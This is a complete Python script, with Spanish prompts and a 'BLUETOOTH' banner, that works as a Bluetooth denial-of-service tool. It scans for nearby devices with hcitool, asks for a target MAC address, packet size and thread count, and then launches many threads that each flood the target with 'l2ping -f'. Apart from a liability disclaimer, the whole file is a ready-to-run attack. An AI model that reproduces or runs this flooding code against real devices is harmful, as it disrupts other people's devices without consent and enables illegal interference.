import os
import threading
import time
import subprocess

def DOS(target_addr, packages_size):
    os.system('l2ping -i hci0 -s ' + str(packages_size) +' -f ' + target_addr)

def printLogo():
    print("                                                      ____   _       _    _  ______  _______   ____    ____   _______  _    _                                                ")
    print("                                                     |  _ \ | |     | |  | ||  ____||__   __| / __ \  / __ \ |__   __|| |  | |                                               ")
    print("                                                     | |_) || |     | |  | || |__      | |   | |  | || |  | |   | |   | |__| |                                               ")
    print("                                                     |  _ < | |     | |  | ||  __|     | |   | |  | || |  | |   | |   |  __  |                                               ")
    print("                                                     | |_) || |____ | |__| || |____    | |   | |__| || |__| |   | |   | |  | |                                               ")
    print("                                                     |____/ |______| \____/ |______|   |_|    \____/  \____/    |_|   |_|  |_|                                               ")
    print("                                                                               CODIGO POR JOEARCHV                                                                                      ")                                       
def main():


    printLogo()
    time.sleep(0.1)
    print('EL SOFTWARE SE PROPORCIONA "TAL CUAL" SIN GARANTÍA DE NINGÚN TIPO. USTED PUEDE USAR ESTE SOFTWARE BAJO SU PROPIA RESPONSABILIDAD. EL USO DEL SOFTWARE ES COMPLETAMENTE RESPONSABLE DEL USUARIO FINAL. LOS DESARROLLADORES NO ASUMEN NINGUNA RESPONSABILIDAD NI SE HACEN RESPONSABLES DE NINGÚN USO INDEBIDO O DAÑO CAUSADO POR ESTE PROGRAMA.')
    if (input("  ESTAS SEGURO? (S/N) > ") in ['s', 'S']):
        time.sleep(0.1)
        os.system('clear')
        printLogo()
        print('')
        print("ESCANEANDO POR FAVOR ESPERE ...")
        output = subprocess.check_output("hcitool scan", shell=True, stderr=subprocess.STDOUT, text=True)
        lines = output.splitlines()
        id = 0  
        del lines[0]
        array = []
        print("ID         DIRECCIÓN MAC          NOMBRE    ")
        for line in lines:
            info = line.split()
            mac = info[0]
            array.append(mac)
            print(f"{id}        {mac}        {''.join(info[1:])}    ")
            id = id + 1

        target_addr = input('INGRESAR MAC > ')

        if len(target_addr) < 1:
            print('[!] ERROR: MAC NO VALIDA')
            exit(0)

        try:
            packages_size = int(input('TAMAÑO DE PAQUETES > '))
        except:
            print('[!] ERROR: EL TAMAÑO DE LOS PAQUETES DEBEN SER NUMEROS ENTEROS')
            exit(0)
        try:
            threads_count = int(input('LOS HILOS CUENTAN > '))
        except:
            print('[!] ERROR: EL RECUENTO DE SUBPROCESOS DEBE SER UN NUMERO ENTERO')
            exit(0)
        print('')
        os.system('clear')

        print("\x1b[31m[*] INICIANDO INTERFERENCIA DE SEÑAL")

        for i in range(0, 3):
            print('[*] ' + str(3 - i))
            time.sleep(1)
        os.system('clear')
        print('[*] CONSTRUYENDO HILOS \n')

        for i in range(0, threads_count):
            print('[*] HILOS CONSTRUIDOS ' + str(i + 1))
            threading.Thread(target=DOS, args=[str(target_addr), str(packages_size)]).start()

        print('[*] TODOS LOS HILOS CONSTRUIDOS ')
        print('[*] INICIANDO')
    else:
        exit(0)

if __name__ == '__main__':
    try:
        os.system('clear')
        main()
    except KeyboardInterrupt:
        time.sleep(0.1)
        print('\n[*] SALIENDO')
        exit(0)
    except Exception as e:
        time.sleep(0.1)
        print('[!] ERROR: ' + str(e))

